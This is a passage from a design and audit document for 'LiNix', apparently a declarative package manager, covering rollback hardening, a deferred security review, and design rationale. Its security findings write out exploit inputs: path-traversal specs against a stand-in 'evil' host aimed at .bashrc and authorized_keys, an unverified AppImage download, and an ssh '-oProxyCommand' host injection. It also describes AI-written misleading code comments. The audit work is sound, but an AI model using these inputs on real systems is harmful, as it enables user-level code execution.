  caller prints "pruned N", so a snapshot/generation the delete couldn't remove is still reported gone
  — a said-so, not a done. Fix: return only the IDs actually deleted, and surface the failures.

- **R23 — Rollback misses a node aborted mid-mutation, and the WAL net lapses after 4h (hardening).**
  On a node failure with auto-rollback, the transaction does `abort_all()` then `rollback()`
  (`transaction.rs:264-265`), but `rollback()` compensates only `self.history` — nodes that *completed*
  (`:241`). A sibling aborted mid-`remove` already ran the OS removal yet never entered `history`, so
  rollback won't reinstall it. The catch is the WAL: that node stays `InProgress`, so the next `sync`
  auto-heals it — **except** `journal.cleanup()` flips `InProgress` entries older than 4h to `Abandoned`
  (`journal.rs:263-271`), after which recovery no longer fires. Narrow (needs abort mid-mutation + no
  sync within 4h + cleanup), so low severity, but a real hole. Harden: either have rollback also
  compensate started-but-not-completed nodes, or make an `Abandoned` entry still trigger a heal/warn
  rather than dropping it from recovery.

### Security — the 2026-07-17 review pass (PROBLEMS RECORDED, solutions NOT yet decided)

> **DEFERRED BY THE OWNER (2026-07-17): SEC1–SEC6 are consciously parked, to be decided and
> fixed in a later dedicated pass — not forgotten.** The owner reviewed a proposed decision batch
> (SEC1 traversal confinement, SEC2 download strictness, SEC3/SEC6 path confinement, SEC4/SEC5
> injection hardening) and chose to handle them later. **Do not implement SEC1–SEC6 until that
> pass.** Already resolved and out of this set: **SEC7** (dead Lua code-exec path — deleted) and
> the **SEC3 panic** (bare `~` out-of-bounds slice — fixed; only the `@target` *confinement*
> question remains deferred).

Unlike R1–R23 above (owner-approved fixes), these are **recorded vulnerabilities awaiting a
solution decision**. Do not implement a fix until the owner rules on the approach. A pass 5
security review confirmed the core is sound — every package-manager command is built as argv
(no `sh -c`, no `format!`-into-shell), the II.12 hook-approval ledger is enforced on every
hook-exec path, sudo is argv not a string, and archive extraction rejects `..`/absolute members.
The problems are in the download/link backends, where a pasted `web:`/`appimage:`/`github:`/`link:`
spec carries untrusted URLs and `@`-options to the filesystem with no validation.

- **SEC1 — VERY SERIOUS. `@bin` path traversal → code execution on next login (web backend).**
  `bin_name` comes straight from the `@bin=` option, unsanitized, and is joined into
  `~/.local/bin/<bin_name>` (`web.rs:168-178`); LiNix then removes whatever sits at that path and
  symlinks it to the downloaded, attacker-controlled file (`web.rs:209-226`). The value is never
  validated — the grammar checks only the option *key* (`config/grammar/options.rs`), not the value.
  **Exploit, one pasted line:** `web:http://evil/payload @bin=../../.bashrc` resolves the destination
  to `~/.bashrc` and drops a symlink there pointing at the attacker's file; the next shell start
  sources it and runs code. `@bin=../../.ssh/authorized_keys`, `../../.config/autostart/x.desktop`,
  `../../.config/systemd/user/…` all work identically. It is user-level (not root), but it is a clean
  single-line RCE from a copied install spec, and it fires **even when the download is HTTPS and
  checksummed** — the traversal is in the destination, not the source. Reachable, high confidence.
  **Solution TBD** (candidates: reject `@bin`/`@target` values containing a path separator or `..`;
  or resolve the final path and refuse if it escapes `~/.local/bin`). Do not implement until decided.

- **SEC2 — SERIOUS. Download-and-execute with no integrity check; plaintext HTTP allowed
  (appimage/web).** `appimage.rs:108-148`: `url = spec.name`, `client.get(url)` accepts any `http://`
  URL, writes the response, `chmod 0o755`, and symlinks it into `~/.local/bin` — with **no checksum
  option at all** for appimage. `appimage:http://evil/foo.AppImage` places an attacker-controlled,
  network-fetched executable on PATH with zero verification; running `foo` later is RCE. `web.rs`
  has the same download→`0o755`→PATH flow, but `@sha256` is *optional* and `http://` is accepted, so
  a bare `web:` spec is download-and-run-unverified. `github.rs` is the same optional-checksum pattern
  but over HTTPS to api.github.com (lower risk). `core/security.rs::verify_checksum` is correct — the
  gap is that nothing forces it to run and nothing forbids `http://`; reqwest also follows up to 10
  redirects, so an `https://` seed can be bounced to `http://`. Reachable, high confidence. **Solution
  TBD** (candidates: reject non-`https` unless explicit opt-in; require `@sha256` or loudly mark an
  unverified install; wire appimage into `verify_checksum`). Do not implement until decided.

- **SEC3 — `@target` (link backend) has no path confinement, and a bare `~` panics.** `link.rs:225-231`
  uses `@target` raw: `~`-prefixed → `home_dir().join(&target_str[2..])`, otherwise
  `PathBuf::from(target_str)` (any absolute path). `link:/src @target=/etc/cron.d/x` places/symlinks a
  file wherever the value points (whatever the user can write). This is closer to the link backend's
  stated purpose (placing dotfiles/managed files) than SEC1's traversal, so the question is whether to
  confine it at all — an explicit decision, not a clear exploit. Separately a robustness bug:
  `&target_str[2..]` on a bare `"~"` (len 1) is an out-of-bounds slice → **panic** on a malformed spec,
  and `"~x"` silently drops the `x` (use `strip_prefix("~/")`, guard the length). ~~**Solution TBD.**~~
  **Panic half FIXED 2026-07-17** (`strip_prefix("~/")`; bare `~` → home dir). **The confinement
  half remains DEFERRED** — see the owner note at the top of this section.

- **SEC4 — SSH host argument injection (fleet), semi-trusted input.** `fleet.rs:24-28` passes `host`
  to `ssh` with no `--` separator: `.arg("-o").arg("BatchMode=yes").arg(host).arg(remote_cmd)`. A host
  like `-oProxyCommand=<cmd>` or `-oPermitLocalCommand=…` is parsed by ssh as an option and runs a
  command on the **local** machine. The `remote_cmd` side is a LiNix constant (`linix status --json` /
  `linix sync -y`), so only `host` is the vector. Hosts come from the user's own `fleet_hosts` config
  or CLI (semi-trusted), so lower severity — but a fleet list from a shared/generated source makes it
  reachable. **Solution TBD** (insert `--` before `host`, or reject hosts beginning with `-`).

- **SEC5 — Latent PowerShell injection in snapshot ops (Windows, elevated).** `snapshot.rs` builds
  PowerShell by interpolation and runs it via `-Command` with elevation: `Checkpoint-Computer
  -Description 'LiNix: {label}'` (`:344` — a `'` in label escapes the quote), and `DeleteStatus({id})`
  / `Restore-Computer -RestorePoint {id}` with `id` interpolated **unquoted** (`:384`,`:392`). Traced:
  `label` is always a compile-time constant (`pre_sync`, `pre_upgrade`, `purge-unmanaged`, `pre_canary`)
  and `id` comes from the system's own `SequenceNumber` via list/bisect/canary/undo — **not currently
  attacker-reachable**, so this is latent, not live. But the day any command lets a user pass a
  snapshot label or id straight through, it becomes an elevated-PowerShell injection. **Solution TBD**
  (bind values as args / validate `id` is numeric); harden now while it is still latent.

- **SEC6 — Module name traversal via `--name` (low).** `layout.rs:102-103`: `module_file(name)` =
  `modules_dir().join(format!("{}.txt", name.to_lowercase()))`. `module add --name ../../foo` writes
  the remote-fetched body to `modules_dir()/../../foo.txt`, up out of `modules/`. Bounded: the forced
  `.txt` suffix defuses most sensitive targets, `refuse_overwrite` (`main.rs:1383`) blocks clobbering
  existing files, and `--name` is user-typed (the `github:`/URL default can't inject a `/`). Low
  severity. **Solution TBD** (reject path separators in `name`).

- **SEC7 — DONE, 2026-07-17.** `LuaHooks::render_template` deleted (and the now-unused `regex::Regex`
  import). Verified zero callers first — the only `.render_template(` in the tree is the link
  backend's Tera renderer. `cargo check --lib`/`--bin` clean, no warnings. *(Original finding:)*
  **Delete the dead, ungated Lua code-exec path (`LuaHooks::render_template`).** `hooks.rs:220`
  evaluates arbitrary `{{ … }}` as **Lua** with no approval-ledger check, and `setup_lua_sandbox`
  leaves `os`/`io`/`os.execute` intact — full code execution. The only `.render_template(` caller in
  the tree is `link.rs:271`, which resolves to the link backend's **Tera** renderer (`link.rs:94`,
  safe); nothing calls the Lua one. It is dead today but a loaded gun: wire it to file content and it
  is ungated RCE. Unlike SEC1–SEC6 this is not solution-TBD — per NO-LEGACY it is a straight **delete**
  (Tera is the live renderer). Remove `LuaHooks::render_template` (and any Lua-eval-for-templating
  scaffolding that exists only to serve it). The hook-execution path — Lua/Rhai/`#!` hooks gated by
  the II.12 ledger — is a separate, correct feature and stays.

## Phase 6 — The five containers

`DISTROS="ubuntu fedora arch alpine tools" ./docker/integration/run.sh jq`

Owed from the last sprint; not run since Stage 2.

---

# Part IV — Verification

**The specific proofs, on the ubuntu image:**
- After `adopt`, the registry holds ~103 packages, not ~579, and does **not** contain
  `libperl5.38t64`.
- `python3` is still installed at the end of the run.
- A large removal is refused without `--allow-mass-removal`.
- `purge-unmanaged` with an unadopted machine is refused by the ratio check.

**Grammar:** a test for every error in Part II.2. Each must produce an error, not a guess.

**Resolution:** two modules declaring the same package differently → error naming both files.

**Guard:** one test per removal path in Phase 3.

**Hooks:** a changed script hash refuses under `-y`.

---

# Part V — Why

> **Do not change a Part II rule without reading its entry here.** Each is the scar of a
> real bug.

**V.1 — Why `-g` died.** `Config::groups_dir` meant two things: the wish-list folder, and
the anchor for `locks.json` / `keep.txt` / `local.txt` / profiles. `-g` moved both, while
`registry.json` — the ownership record — never moved. So `plan -g /B` read /B's one package
against an ownership record claiming 579, called 578 of them drift, and purged the machine.
`-g` is gone because "which folder" stopped being a question anyone asks: files are storage,
modules are the unit, profiles choose.

**V.2 — Why profiles choose and modules hold.** It's the one sentence that explains the
whole system. The moment profiles hold things or modules make choices, it stops being true.
A module can never reference a profile (the layering rule) because otherwise "what does
`editors` contain?" has a different answer depending on what you activated — the library
cannot depend on the app.

**V.3 — Why a profile may still hold packages.** Decided knowingly against V.2's tidiness,
because `--into Work` is a real want. The cost is real: those packages are unshareable
forever, and you find out the day you want to share them.

**V.4 — Why `group:` and `include:` died.** `group:editors` pointing at a file was **already
a no-op** — the resolver seeded every `.txt` unconditionally, so the file was loaded before
you named it. It looked like opt-in and wasn't, which taught people a wrong model of how
LiNix decides things. `include:` strictly superseded it.

**V.5 — Why conflicts are errors.** Files were read in filesystem order and first
declaration won. `a.txt: jq@1.6` vs `b.txt: jq@1.7` was decided by the disk. Sorting the
read order only makes the wrong answer deterministic.

**V.6 — Why `keep.txt` died.** It lived in the groups folder and ended in `.txt`, so the
resolver ate it: *"never remove firefox"* also silently meant *"install firefox"*. It was
held back by a hardcoded one-element denylist. **Separate by location, not by denylist** —
and `forget` gives people the thing they actually wanted, which was a way to make LiNix let
go.

**V.7 — Why `absent:` is the one exception to "only removes what it manages".** Because you
named it. Everything else LiNix touches, it owns. `absent:` is you reaching outside that,
deliberately, by name. It stays a line rather than a file because a file can't be turned off
per profile, can't be shared, and puts LiNix's bookkeeping back in a folder you author.

**V.8 — Why blocks use `{ }` and not `( )` or `end`.** `( )` is already the grouping operator
in profile math — same character, two meanings, the trap we removed from `include:`. `end` is
clumsy. "Pick your own delimiter" means nobody can read anyone else's files.

**V.9 — Why block values are verbatim and `#` doesn't comment inside them.** Fail loud. If
`#` commented there, `after_install = curl -H "X: #tag"` silently truncates and runs the
wrong command. The other way, `version = 1.6 # my pin` gives a version the parser visibly
rejects. **You reached for the block form precisely because you needed a value the short
form couldn't hold. Verbatim is what you asked for.**

**V.10 — Why no quotes.** `"` needs `\"` needs `\\` needs a newline rule. The block form
makes the problem stop existing rather than giving it a rule.

**V.11 — Why the extension is cosmetic.** Nothing is active unless a profile names it, so
`use editors` against a misnamed file says *"no module named `editors`"* with a list. **The
reference is the safety net**, not the extension.

**V.12 — Why adopt takes manual-only.** Not because 579 is a big number. **Declaring a
dependency breaks dependency management.** Put `libgpm2` in a module and you've declared it,
so LiNix keeps it forever; remove vim and it stays, because apt says "orphan" and your file
says "I want this" and the file wins. Monday's bug was claiming ownership of a set that was
never LiNix's.

**V.13 — What "estimate" means.** apt records that something was **explicitly requested** —
not **who** requested it. Canonical's installer marked ~90 packages manual at image-build
time; they are indistinguishable from the `apt install vim` you typed. There is no field for
"a human, on purpose." **(measured)**

**V.14 — Why the priority order.** Most of the current 10-backend order is **meaningless** —
apt, pacman and dnf never coexist. The order that decides something is **system manager vs
language manager**: if both apt and cargo have `ripgrep`, the **system one wins**, because
your distro maintains it and updates it with everything else. Language managers are for what
your distro doesn't carry. That also explains pip last: it installs into your system Python
and can break it. *(uv and pipx being absent from the order is simply a bug.)*

**V.15 — Why `priority` also means "enabled".** One list, one question: *which package
managers does this setup use, and in what order.* It replaces four settings for one fact
(`backend_priority`, `enabled_backends`, `hostname_backends`, `default_backend`) of which
only two merge today. An explicit `snap:foo` failing when snap isn't listed is a feature: it
catches typos and makes your backend set declared rather than inherited.

**V.16 — Why bare names get locked.** LiNix *probes* — "does apt have ripgrep?" So `ripgrep`
lands on cargo today, Ubuntu adds it tomorrow, and the same unchanged line resolves to apt:
LiNix uninstalls from cargo and installs from apt because a repo you don't control changed.
**The bare name is the question; the lock is the answer.**

**V.47 — Why a `repo:` line names its backend.** *(Decided 2026-07-17.)* A repository belongs
to exactly one package manager — a PPA is apt's, a COPR is dnf's, and `add-apt-repository`
run against dnf is a system command that fails, or worse, half-succeeds. A bare `repo:SPEC`
would make LiNix guess which backend, and the honest ways to guess are all wrong: a
prefix→backend table (`ppa:`→apt) is a second copy of a fact each backend already owns and grows
with every ecosystem (P4); "the one system backend in `priority`" fails at run time on the
machine where the guess is wrong, which is the machine you least want a repo command
misfiring on. So the backend is named, exactly as a package line names one: `repo:apt:ppa:...`.
It is refused when the backend is not in `priority` (V.15), and a bare `repo:` is a parse
error that says so — caught in the file, not at the command. **The repo and the package it
serves already sit together in a module (II.16); naming the backend once more is the cost of
never running the wrong tool.**

**V.17 — Why regex is live by default.** "Give me all the fonts, including ones that don't
exist yet" is real. Mandatory locking turns a living pattern into a frozen list and defeats
the point of writing a pattern. **The lock file is the switch** — that's how every lockfile
already works.

**V.18 — Why regex matches names, not meaning.** `photo*` finds `photocollage`,
`photoprint`, `photoqt` — and misses `gimp`, `darktable`, `krita`, `rawtherapee`,
`shotwell`, `digikam`, `inkscape`: every actual photo editor. Real prefix *families* are the
good use (`texlive-*`, `fonts-*`). Debian's own answer to a family is a **metapackage** —
someone's judgement rather than a naming coincidence — and better where one exists.

**V.19 — Why `max_removals = 20` works and `max_installs` has no default.** **20 is more
than a person removes on purpose** — calibrated against human behaviour, so a plan removing
50 is wrong at any scale on any machine. **Installs have no equivalent ceiling: the biggest
install you'll ever do is the correct one** (a fresh machine). So `max_installs` exists but
defaults to unset — the number is yours, for your reason. *(Rejected: screen height — the
same command would behave differently on different machines. Rejected: a ratio — a fresh
machine's ratio is undefined.)*

**V.20 — Why the ratio catches Monday and a count doesn't.** On Alpine, `adopt` correctly
took 14 packages and a mis-scoped `prune` scheduled all 14 for removal — **under the count
limit, none protected, all things you'd cry about**. The count misses it on small machines.
**Manage 3, delete 576 → you have made a mistake, on every machine, always.**

**V.21 — Why `purge-unmanaged` is a command and not a mode.** **Sync is then never
dangerous** — not "safe by default", but safe permanently. No setting anyone can flip,
inherit, or copy from a dotfiles repo makes a routine sync delete something it didn't
install.

**V.22 — Why `-y` cannot skip a refusal.** Every CI job and every script passes `-y`, and an
unattended run cannot notice a machine being dismantled. **`-y` means "don't ask me". It has
never meant "ignore your safety rails", and every place it currently does is a bug.**

**V.23 — Why `confirm_destructive` died.** In a declarative system, **deleting a line is the
confirmation.** You said what you wanted; asking whether you meant it is asking twice. And
the setting named after removals gated a module-file overwrite (not a removal) while missing
both `prune` and `sync`.

**V.24 — Why the plan always leads with counts.** **A warning that only fires sometimes is a
mechanism that can be miscalibrated. A summary that's always there can't be.**

**V.25 — Why the 16 protections became 5.** **Eleven of them were never protections — they
were declarations wearing a protection costume.** "Don't remove this, it's leased" →
`@expires=`. "…you installed it imperatively" → it's in the `imperative` module like
everything else. "…it's held" → `@hold`. "Do remove this, it's bloatware" → `absent:`. Each
existed because there was **no way to say the thing directly**, so someone bolted an
exception onto the removal path instead. `protect_imperative` is the clearest: it exists
*purely* to stop drift-pruning deleting `linix install`-ed packages, because they lived in
`local.txt`, which `-g` could move out from under the registry. **Someone met Monday's bug,
understood the symptom exactly, and patched it with a flag.** Not one behaviour was deleted;
they moved to where they were always trying to be.

**V.26 — Why protection is a refusal, not a declaration.** Everything else is a statement of
intent ("I want this"). Protection is "I will not do that, and there is no flag." It doesn't
care whether the package is managed, declared, adopted, or predates LiNix. That's why it
lives in preferences and not in a module — and why deleting a declared `apt:python3` line
makes LiNix refuse until you unprotect it.

**V.27 — Why hooks are lines despite the supply chain.** `use` is **already** a trust
decision: a `repo:` line in someone's module means they can ship you any package with any
script in it. Hooks make that road shorter, not different in kind. **The lock is the
approval** — because you approve a script once and they edit it three months later, which is
how most npm incidents actually worked: the malicious version was never the one anyone
reviewed. **Hash everything, including your own scripts**, because "did I write this?" has
no clean answer once you've cloned your own repo onto a second machine — and the friction
that catches you editing `setup.sh` is the same friction that catches a teammate's `git
pull`.

**V.28 — Why schedules got their own file.** `active` answers exactly one question: *what is
this machine set to right now?* A schedule is written once and forgotten — a fact, not a
switch. An active-list for schedules would invent a state that needn't exist ("defined but
off"), so you'd check two files for one fact. And the separate file means a cron job can't
arrive via `use` at all. **Door left open, deliberately unbuilt:** "sync nightly when I'm in
Work" — a `schedule:` line can live in a module and be selected by a profile; the grammar
already allows it.

**V.29 — Why `@requires` survives.** **(verified, `planner.rs:407-426`)** `spec.requires`
becomes a real `graph.add_edge` — install **ordering**. A module is a *set* and says nothing
about order. `@requires` is the one thing modules can't say. It matters only for things
outside a package manager (a `.deb` from a URL, a GitHub binary) — things with **no one to
ask**. apt's own dependencies are ordered for free at `planner.rs:427`.

**V.30 — Why git is the history.** **LiNix commits only on a successful sync, so every
commit is a state your machine actually reached** — not one you asked for. `git log` is
where your machine has been; `git diff` and `linix plan` are the same question; rollback can
never take you somewhere that never worked. And the registry needs no history, because
declaration + convergence reproduces it.

**V.31 — Why no commit algebra.** Set math works on profiles because they're choices you're
making *now*. Commits are moments that already happened, and "the union of March and today"
isn't a machine anyone asked for. Git covers what's real. **Intersect of commits does not
exist in git and no use case was found** — twenty years of git not having it is evidence.

**V.32 — Why lock signing died.** **Signing one file in a folder of unsigned files protects
nothing.** Anyone who can edit `locks.json` can edit your modules — they'd change `apt:jq`
to `apt:evil` and no signature would notice. It guards one door in a building with no walls.
Ours was `sha256(key + "|" + text)` — a construction cryptographers warn against — compared
with `==`, which leaks timing. And **appearance is worse than nothing, because you stop
looking.** `git commit -S` signs everything, with real crypto, verified by a tool that's been
attacked for twenty years.

**V.33 — Why `clone` died.** It copied **the installed set, not the intent** — you got a
machine with the same packages and no idea why. `git clone && linix sync` gives the intent,
the history, the pins, and the ability to change it afterwards.

**V.34 — Why `prune` and `orphans` died.** sync removes drift by definition, so `prune` is
sync with the install half amputated. "Prune" meant four unrelated things; deleting the
command leaves exactly one meaning ("delete old history") for the first time. `orphans`
shows what sync would remove, which is `plan` — and its message named two commands and
described neither.

**V.35 — Why `--backend` is refused on removals.** A scoped removal is Monday's exact shape:
**you narrow what LiNix looks at without narrowing what it owns**, so everything outside the
scope looks like drift.

**V.36 — Why `clean` survives.** It's apt's housekeeping, not LiNix's drift, and only apt
knows about it. It goes through the guard because `autoremove` is a mass removal LiNix
didn't plan and has famously eaten desktop environments. It stays explicit because automatic
cleanup is a surprise removal.

**V.37 — Why suspensions survive.** Nearly deleted — "I want this and I don't want this"
smells like a contradiction with a timer. The case that saves it: **"take the game away
until the weekend."** People genuinely do that; nothing else here does it; and once leases
exist, suspensions are the same machinery pointed the other way.

**V.38 — Why times are absolute.** "2 hours" can't work in a file: the machine reading it
next week has no idea when you wrote it. That's exactly why `@lease=2h` is inert today.

**V.39 — Why `install`/`uninstall`/`forget`.** A symmetric pair plus one word that can't be
misread. `remove` and `unmanage` sat one word apart and did opposite things to your disk —
reach for the wrong one and you don't get an error, you get a deleted package.

**V.40 — Why three landing modules.** Provenance ends up in the filename: open
`modules/hooks.txt` and see exactly what got in behind LiNix's back. One `local.txt` mixes
them and forgets which was which.

**V.41 — Why "detected, not configured".** LiNix should not be *told* you have btrfs; it
should look. Not told you have four cores. Almost every "local fact" in `config.toml` is
something LiNix could work out in a second and instead asks you to maintain by hand, forever,
on every machine. **That is not configuration, it's homework.**

**The `max_parallel` exception (owner ruling, 2026-07-17).** This rule's first draft called
`max_parallel` homework too — and noted it was overwritten at `sync/mod.rs:296` anyway, "so the
setting is already a lie." Both halves are now dead: the overwrite is gone (`sync/mod.rs:293-297`
reads it as *"the user's knob"* and honours `self.config.max_parallel.max(1)`), and the owner has
ruled to **keep** it. The distinction that saves the rule: the core count is a *fact* (detected),
but *how many of those cores to use* is a *preference* — you may want to cap it to keep the
machine responsive while a big sync runs. A preference LiNix cannot look up is not homework. So
`max_parallel` stays: detected as the default, overridable by hand.

**V.43 — Why the guard has nine refusals and not five.** The first draft said five (then
listed six). It was written before anyone re-read `policy.toml`, which held five rules and
was marked in II.17 as moving to `[guard]`. Two of them had somewhere to go —
`deny_packages` was already in the list, and `allow_backends` is what the `priority` file
means (V.15). **The other three had nowhere, and "delete" was never decided — it was
overlooked.** `pinned_only`, `require_snapshot` and `deny_vulnerable` are all exactly the
shape V.26 defines: not "I want this" but "I will not do that". They are refusals, so they
live where refusals live, and `-y` cannot skip them for the same reason it cannot skip any
other (V.22). *Corrected knowingly against the headline: a wrong number in a document is
cheaper than three deleted safety rails. If a rule here ever stops being a refusal and
starts being a preference, that is the signal it does not belong in `[guard]`.*

**V.46 — Why set math costs a package its module name, and why `include` died.** *(Decided
2026-07-17, during Phase 2f. II.4 required set math and nothing implemented it:
`model::profiles::evaluate_expression` had no caller outside its own tests, and the only
working implementation was `compose()` in the old `app/profile.rs`, over flat strings.)*

**The shape does not fit, and pretending otherwise is the bug.** Resolution is
`profiles → the modules they reach → the packages in those modules`. Set math breaks that
chain: `(Work | gaming) & security` is **an intersection of package sets**, and there is no
module whose contents are that intersection. So a profile using set math resolves to packages
directly rather than naming modules.

Making `&` operate on module *names* was the alternative, and it answers a different question
than the one asked: the intersection of `{editors}` and `{security}` is empty even when both
hold `vim`. Inventing a synthetic module to hold the result was the other, and it names a
module that does not exist on disk, so `upgrade --module` would match something nobody can
open.

**The predicted cost turned out not to exist, and that is worth stating plainly because this
document predicted it wrongly.** The first draft of this entry said set math costs a package
its module name. It does not: the implementation maps expression atoms back to **the
statements they came from**, not to strings, so a package that survives an intersection still
carries its `Origin` — its file, and therefore its module. `upgrade --module editors` finds
`vim` through an `exclude`. There is a test (`a_package_surviving_set_math_still_knows_its
module`). The only lines that get profile scope alone are ones written in the profile itself,
including a bare package atom inside an expression — which is correct, because that line
really is in the profile. **Keep mapping back to statements. Mapping back to strings is what
would make the predicted cost real.**

**`include` died because `use` already is it.** II.4 listed `include`/`exclude`/`intersect` as
the three directives while II.2 listed `use NAME` as the way to reference a module or profile
— and for the union case those are the same operation with two names, which is the exact
"two ways to do one thing" disease this design exists to cure, sitting inside the spec. `use`
wins: it is II.2's word, it is the one modules use too, and one word for "bring this in"
everywhere beats two. `include` is an error that says so.

**V.42 — Why the comment rule.** This codebase has been touched by many AIs, and this is what
that leaves behind: models narrate what they just wrote and congratulate themselves for it,
because that reads like effort, and each one looks fine on its own. The repo already proves
the rule works — `core/manager.rs:86-93` explains *why* the `tracks_manual` gate exists and
what happens if it's wrong; `generic.rs:363-370` explains in nine lines that choco lists
Title-case "Wget" for install-id "wget" so `remove` silently no-ops, and why the fix must be
Windows-only because npm has `socket.io`. **Those two are worth more than the other 137
combined, and they're the same length.** The cost of the rest is that **they trained everyone
to skip** — the reason 32 comments in this repo are outright false, each of which someone read
past. *(The first draft's example, `audit()` documented as "a **destructive** Discovery cycle …
without generating files or acquiring state", has since been fixed in the code and now reads
correctly. The measured 32 are the ones that remain.)*

**V.44 — Why `activate` writes a list and there is no `-r`.** The file is the state, so a
command that activated *without* writing `active` would be a second place the answer lives —
the exact defect `-g` and `keep.txt` died of (V.1, V.6). Set, add, subtract, because those
are the three things you do to a list. **`deactivate` rather than `activate -r`** because
`install`/`uninstall` already settled that the opposite of a verb is a verb (V.39), and a
flag that silently inverts a command is how you delete something at 2am by leaving off one
character. The empty list is the one refusal: `linix activate $PROFILE` with `$PROFILE`
unset would otherwise read as *"turn everything off"* and be perfectly valid. The guard would
catch it (V.19) — but the guard is for decisions you meant, and this one nobody means.
**`activate NAME…` still overwrites `when` blocks without asking**, and that is not an
oversight: it is the set form, it sets, and a form that quietly kept part of the old file
would leave the machine in a state you did not type. The file is in git; that is what git is
for (V.30). **It does not ask and it does not stay quiet** — it names each block it removed.
*Asking and reporting got argued as one thing and they are not: the case against a prompt is
that overwriting the list is the command's own job (S6), and none of that is a case for
hiding what the job did.*

**Why `deactivate` reaches into a `when` block when `activate -a` does not** *(decided
2026-07-17, after the first draft of this entry said the opposite)*. The first rule here was
that LiNix never edits a block — a block is something you wrote — so `deactivate Travel` would
remove the top-level line and report *"it is still activated by the `when` block on line 4."*
**That sentence is the argument against itself.** It is a command named "deactivate"
announcing that it did not deactivate. **A verb that reports the state it failed to reach is
the `-g` disease in miniature: the name says one thing, the file says another, and you find
out later.** So it removes the name wherever this host would read it, and the empty block goes
with it.

**The asymmetry with `activate -a` is real and it is not a compromise: adding has a choice of
where to put the name, removing has none.** `-a` appends at the top level because a block is a
rule you wrote and a new name has no business joining it — there is a right answer and it is
"outside". `deactivate` gets no such freedom; the name is where it is, and the only way to
leave the block untouched is to not do the job.

**And why it stops at blocks that do not apply to this host.** Not caution — the same rule,
read carefully. `deactivate` turns off what is on; on the desktop, `when host == laptop {
Travel }` has nothing on, so there is nothing to turn off, and removing the line would be a
different command (*"never activate Travel anywhere"*) that nobody typed. **`active` is a file
you commit and share (V.30), which makes "edit it wherever the name appears" a way to change a
machine you are not sitting at from one you are.** The blast-radius reasoning is V.22's, and
it lands in the same place: **the refusal is cheap and the mistake is not.** It says why, and
names the line, so the hand-edit is one keystroke away for the person who did mean every
machine.

**V.45 — Why a cycle is an error and not deduped.** If `active` were the only consumer you
could visit each profile once and move on, because union doesn't care how many times it sees
a name. But profiles have `&`, `\` and `-` (II.4), so `Work include Gaming` /
`Gaming exclude Work` has no answer to settle on — not a redundant answer, **no answer**.
Deduping picks whichever order the resolver happened to walk in, which is V.5's defect
wearing a different hat: files were read in filesystem order and first won, and the fix was
to stop guessing and say so. Naming the whole loop instead of the last edge is II.2's rule —
the error names the file and the line — and it is the difference between *"there is a cycle"*
and a user who can see which of the three lines they meant to delete.

---

# Part VI — Bugs

## VI.1 Killed by this design — no work needed

- `-g` replaced the wish list while the ownership record never moved → phantom drift → the
  purge. **(C2, C4, C5, C6, C14, D1, D2)**
- `keep.txt` read as a wish list. **(E2, E10)**
- Undefined manifest read order. **(C4)**
- `upgrade --profile` matches zero packages, always — builds `manifest:work`, tags are
  `manifest:work.txt`, and per-profile provenance is destroyed at materialize time anyway.
  **(verified)**
- `-vim` in a manifest becomes a package named `-vim` while the README documents it as
  exclusion. **(verified)**
- Generations record absolute paths → rollback writes to a dead directory and reports
  success. **(verified)**
- Generation ids are epoch seconds → two syncs in one second silently overwrite history.
  **(verified)**
- `config.toml` never travels with history.
- "Rollback" means two things depending on flags; `undo` assigns the registry by fiat.
- Manifests stored twice on independent budgets.
- ~~Two snapshot retention engines. **(E4)**~~ **DONE 2026-07-17** — the duplicate
  `prune_stale_snapshots` is deleted; all pruning goes through `prune_with_policy` +
  `Config::snapshot_retention()`. See the Phase 4 "one retention engine" note.
- Every bundle restore is unverified by construction. **(H1)**
- `linix repo add` records nothing → modules are not portable.
- `linix shim --source` is required, documented, and thrown away. **(verified)**
- Holds (machine-local) silently beat signed locks (portable).
- `@lease=` in a manifest is inert. `remove --temp` is undone by the next sync.
- `orphans` message false on both counts. **(C12)**
- "prune" means four things. **(E3)** "orphans" means two plus a dead third. **(E5)**
- `confirm_destructive` gates the wrong thing. **(E12)**
- Any typo becomes a package name.
- `ScopedFilter::None` — an implicit spare-everything switch.

## VI.2 Carried forward — still real work

| | |
|---|---|
| **C1** | ~~`uninstall` never consults protection. `linix uninstall libc6` proceeds~~ **DONE by architecture, verified 2026-07-17.** `handle_uninstall` undeclares then calls `handle_sync`; the removal is drift, and `SyncEngine::sync` runs `guard::enforce` (`GuardScope::Sync`) before touching anything — so `uninstall libc6` is refused (libc6 is protected). No direct-removal path bypasses sync. → **Phase 3** |
| **C3** | ~~lease and `absent:` removals skip protection~~ **DONE, verified 2026-07-17.** Leases were deleted in Phase 2 (no lease removal path exists); `absent:` becomes drift removed by `sync`, which is guarded. → **Phase 3** |
| **C8** | ~~ghost-shell exit force-removes with no protection, no guard, no confirmation~~ **DONE, verified 2026-07-17.** `cleanup_transient_env` builds a Remove graph and routes it through `engine.sync(changes, GuardScope::ShellExit)`, which runs `guard::enforce` first — the exit removal is guarded like every other. → **Phase 3** |
| **C9** | ~~lease expiry implemented twice with different semantics~~ **DONE, verified 2026-07-17.** Owner decision: the intended end state is **`@expires=<absolute date>` temporary installs reclaimed by one sweep** (the `@lease=2h` syntax was retired in Phase 2). There is now exactly **one** implementation: `App::sweep_expired_leases` (`context.rs:653`), driven by the single `StateRegistry::get_expired_packages` (`state.rs:290`), called once from `perform_maintenance`. The second, differently-behaved expiry path went with the deleted lease command. The sweep running on every state-changing command is correct — it is how a due expiry is honoured promptly. → **Phase 3** |
| **C13** | **DONE (Phase 2r/2s).** The grammar is the one **statement** parser, and every non-validating `backend:name` splitter is gone. `config/manifest.rs` (`ManifestEngine`) was deleted whole in Phase 2n; `app/insight.rs`'s splitter is gone; `main.rs`'s last one (`lease set`) went with the retired `lease` command in 2s. **Re-measured 2026-07-17 — the splitters that remain are none of them the C13 risk:** `config/parser.rs:94` (`split_removal_target`) and `main.rs:686` (a `requires` target) both consult the registry before treating a prefix as a backend; `model/resolve.rs:522` extracts the *name* half of an already-resolved key; `parsers/ecosystem.rs:275` splits `name:ver`, not a backend. None reads an unvalidated backend name. → **Phase 2** (done) |
| **B3** | `unprotected_packages` doesn't beat OS-essential; `linix protected` reports the opposite of what the guard does → **Phase 3** |
| **E7** | Adopt consulted `protected_packages`, so "protected" meant *never remove* in the guard and *never adopt* in `migrate.rs` — a package you could not adopt and could not remove, for the same reason. **FIXED (Phase 2m):** adopt takes every manual package, protected ones included (protection stops the removal, not the adoption — V.26); only OS-essential is held back, in the commented-out second section II.9 specifies → **Phase 2** (fixed) |
